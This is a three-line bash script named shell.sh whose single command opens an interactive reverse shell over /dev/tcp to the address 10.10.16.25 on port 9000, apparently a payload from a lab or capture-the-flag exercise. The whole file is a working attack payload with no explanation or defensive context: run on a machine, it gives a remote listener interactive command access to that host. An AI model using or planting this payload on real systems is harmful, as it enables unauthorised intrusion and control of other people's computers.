#shell.sh
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.16.25/9000 0>&1"
